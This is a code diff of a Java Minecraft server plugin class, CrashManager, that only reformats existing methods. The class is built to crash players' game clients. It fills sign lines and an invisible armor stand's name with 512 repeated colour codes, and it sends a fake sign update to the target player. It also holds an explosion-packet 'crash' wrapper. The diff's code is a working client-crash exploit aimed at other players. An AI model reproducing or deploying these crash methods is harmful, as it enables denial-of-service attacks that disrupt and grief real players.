@@ -19,7 +19,11 @@ import java.util.ArrayList;
 
 public class CrashManager {
 
-    public enum CrashType { SIGN, ENTITY, PAYLOAD }
+    public enum CrashType {
+        SIGN,
+        ENTITY,
+        PAYLOAD
+    }
 
     private final WrapperPlayServerExplosion crashPacket;
 
@@ -35,14 +39,22 @@ public class CrashManager {
     public void crashWithSign(Player player) {
         Location loc = player.getLocation().clone();
         Block block = loc.getBlock();
+        
         block.setType(Material.OAK_SIGN, false);
+        
         String crashLine = "§c".repeat(512);
         if (block.getState() instanceof Sign) {
             Sign sign = (Sign) block.getState();
             for (int i = 0; i < 4; i++) sign.setLine(i, crashLine);
             sign.update();
         }
-        player.sendSignChange(block.getLocation(), new String[] {crashLine, crashLine, crashLine, crashLine});
+        
+        player.sendSignChange(block.getLocation(), new String[] {
+            crashLine,
+            crashLine,
+            crashLine,
+            crashLine
+        });
     }
 
     public void crashWithArmorStand(Player player) {
@@ -50,6 +62,7 @@ public class CrashManager {
         String crashName = "§c".repeat(512);
         World world = player.getWorld();
         ArmorStand stand = (ArmorStand) world.spawnEntity(loc, EntityType.ARMOR_STAND);
+        
         stand.setInvisible(true);
         stand.setCustomName(crashName);
         stand.setCustomNameVisible(true);
